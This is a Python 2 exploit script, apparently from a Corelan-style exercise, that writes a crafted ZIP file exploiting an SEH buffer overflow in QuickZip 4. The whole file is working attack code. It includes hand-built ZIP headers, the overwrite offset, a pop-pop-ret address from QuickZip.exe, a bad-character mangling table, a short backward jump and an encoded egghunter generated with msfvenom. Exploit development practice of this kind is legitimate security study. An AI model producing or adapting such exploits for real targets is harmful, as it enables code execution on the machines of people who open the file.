#!/usr/bin/env python
# Original Author : corelanc0d3r
# Pocython Author: d3cc3pt10n
# Note: Python 3 doesn't work, Python 2 does...weird!

from struct import pack

filename = 'pycorelanboom.zip'
filesize = '\xe4\x0f'

# Local file header
# 30 bytes
ldf_header = (
        "\x50\x4B\x03\x04"
        "\x14\x00\x00\x00"
        "\x00\x00\xB7\xAC"
        "\xCE\x34\x00\x00"
        "\x00\x00\x00\x00"
        "\x00\x00\x00\x00"
        "\x00"
        + filesize +          # file size 4068
        "\x00"
        "\x00\x00")

# Central directory header
# 46 bytes
cdf_header = (
    "\x50\x4B\x01\x02"
    "\x14\x00\x14\x00"
    "\x00\x00\x00\x00"
    "\xB7\xAC\xCE\x34"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    + filesize +
    "\x00\x00\x00\x00"
    "\x00\x00\x01\x00"
    "\x24\x00\x00\x00"
    "\x00\x00\x00\x00")

# End of file central directory header
# 22 bytes
eofcdf_header = (
    "\x50\x4B\x05\x06"
    "\x00\x00\x00\x00"
    "\x01\x00\x01\x00"
    "\x12\x10\x00\x00" # Size of central directory (bytes)
    "\x02\x10\x00\x00" # Offset of start of central directory,
                       # relative to start of archive
    "\x00\x00")

# payload_length = 4064 pattern + 4 .txt extension = 4068
#[+] Examining SEH chain
#    SEH record (nseh field) at 0x0012fbfc overwritten with normal pattern : 0x41396a41 (offset 297), followed by 1020 bytes of cyclic data after the handler
# Message=  0x00407a33 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [QuickZip.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\QuickZip4\QuickZip.exe)



# 4 byte jump
# Best jump offset \xd8 \xfe \xff \xff
# Bad character mangle table. What byte becomes in quickzip
# \x81 -> FC || \x82 -> E9 || \x83 -> E2 || \x84 -> E4 || \x85 -> E0
# \x86 -> E5 || \x87 -> E7 || \x88 -> EA || \x89 -> EB || \x8a -> E8
# \x8b -> EF || \x8c -> EE || \x8d -> EC || \x8e -> C4 || \x8f -> C5
# \x90 -> C9 || \x91 -> E6 || \x92 -> C6 || \x93 -> F4 || \x94 -> F6
# \x95 -> F2 || \x96 -> FB || \x97 -> F9 || \x98 -> FF || \x99 -> D6
# \x9a -> DC || \x9b -> A2 || \x9c -> A3 || \x9d -> A5 || \x9e -> 50
# \x9f -> 83 || \xa0 -> E1 || \xa1 -> ED || \xa3 -> FA || \xa4 -> F1
# \xa5 -> D1 || \xa6 -> AA || \xa7 -> BA || \xa8 -> BF || \xa9 -> AC
# \xaa -> AC || \xab -> BD || \xac -> BC || \xad -> A1 || \xae -> AB
# \xaf -> BB || \xb0 -> A6 || \xb1 -> A6 || \xb2 -> A6 || \xb3 -> A6
# \xb4 -> A6 || \xb5 -> A6 || \xb6 -> A6
# 83 == -125 bytes.
# 125 - 32 byte egghunter = 93 
nseh = '\x73\xF9\xFF\xFF'
# EIP
# < means little-endian
# L means unsigned long - 4 bytes
seh = pack('<L', 0x00407a33)
# msfvenom -p generic/custom PAYLOADFILE=egghunter.bin BufferRegister=EDX -e x86/alpha_mixed -a x86 -f py --platform windows -v egghunter
# Payload size: 117 bytes
egghunter =  ""
egghunter += "\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
egghunter += "\x4a\x4a\x4a\x4a\x4a\x37\x52\x59\x6a\x41\x58\x50"
egghunter += "\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
egghunter += "\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
egghunter += "\x75\x4a\x49\x50\x66\x4d\x51\x59\x5a\x79\x6f\x64"
egghunter += "\x4f\x50\x42\x63\x62\x71\x7a\x53\x32\x61\x48\x5a"
egghunter += "\x6d\x74\x6e\x47\x4c\x55\x55\x63\x6a\x72\x54\x78"
egghunter += "\x6f\x6e\x58\x31\x67\x64\x70\x50\x30\x61\x64\x6c"
egghunter += "\x4b\x5a\x5a\x6e\x4f\x50\x75\x68\x6a\x4c\x6f\x73"
egghunter += "\x45\x39\x77\x79\x6f\x6b\x57\x41\x41"
# 297 until we hit nseh, so 297 - 117 = 180
payload = egghunter + ('A' * 180) + nseh + seh + ('D'*(4068 - 8 - 297))
payload_length = len(payload)

if payload_length != 4068:
    print("[!] Warning, payload size isn't correct!")

exploit = ldf_header + payload + cdf_header + payload + eofcdf_header

print("Size : {s}n".format(s=payload_length))
with open(filename, 'w') as f:
    f.write(exploit)
